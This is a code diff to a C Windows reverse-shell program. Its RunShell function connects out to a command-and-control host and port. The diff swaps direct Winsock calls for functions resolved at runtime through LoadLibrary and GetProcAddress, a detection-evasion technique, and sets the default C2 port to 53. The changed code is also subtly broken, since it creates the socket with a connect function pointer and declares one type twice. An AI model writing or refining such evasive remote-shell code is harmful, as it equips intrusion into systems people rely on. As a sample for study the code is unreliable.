@@ -17,21 +17,37 @@ BOOL (WINAPI * ptrCreateProcessA) (
   LPSTARTUPINFOA        lpStartupInfo,
   LPPROCESS_INFORMATION lpProcessInformation
 );
+typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
+typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
+typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
+typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
+typedef u_short(WSAAPI* HTONS)(u_short hostshort);
+typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
+typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);
+typedef int(WSAAPI* WSACLEANUP)(void);
 
 void RunShell(char* C2Server, int C2Port) {
         SOCKET mySocket;
         struct sockaddr_in addr;
         WSADATA version;
         WSAStartup(MAKEWORD(2,2), &version);
-        mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+        HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
+        WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, "WSAStartup");
+        WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, "WSASocketA");
+        INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, "inet_addr");
+        HTONS myhtons = (HTONS) GetProcAddress(hws2_32, "htons");
+        WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32, "WSAConnect");
+        CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2_32, "closesocket");
+        WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2_32, "WSACleanup"); 
+        mySocket = myWSAConnect(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
         addr.sin_family = AF_INET;
 
         addr.sin_addr.s_addr = inet_addr(C2Server);
         addr.sin_port = htons(C2Port);
 
-        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
-            closesocket(mySocket);
-            WSACleanup();
+        if (myWSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
+            myclosesocket(mySocket);
+            myWSACleanup();
         } else {
             printf("Connected to %s:%d\\n", C2Server, C2Port);
 
@@ -59,8 +75,8 @@ int main(int argc, char **argv) {
         RunShell(argv[1], port);
     }
     else {
-        char host[] = "10.10.189.156";
-        int port = 4466;
+        char host[] = "ip.address"; //C2 config
+        int port = 53; // C2 port connection
         RunShell(host, port);
     }
     return 0;
